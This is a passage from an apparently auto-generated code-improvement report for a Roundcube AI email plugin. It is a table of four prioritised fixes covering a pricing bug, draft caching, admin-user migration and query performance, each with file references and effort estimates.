| **P2** | **Mathematics** | [`src/lifeprisma_ai.js:2203-2223`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2203-L2223) | **Low** (1h) | Resolves falsy zero pricing bug and adds Gemini fallback rates. |
| **P2** | **Architecture** | [`lifeprisma_ai.php:1868-1877`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1868-L1877) | **Medium** (3h) | Adds non-Redis state cache to prevent duplicate drafts. |
| **P3** | **Architecture** | [`lifeprisma_ai.php:582-611`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L582-L611) | **High** (5h) | Migrates `__genia_admin__` dummy user to native Roundcube config/system table. |
| **P3** | **Performance** | [`lifeprisma_ai.php:628-659`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L628-L659) | **Medium** (2h) | Eliminates full table scans on `users.preferences` with cached metrics. |

---
*Report generated and validated autonomously against codebase baseline.*
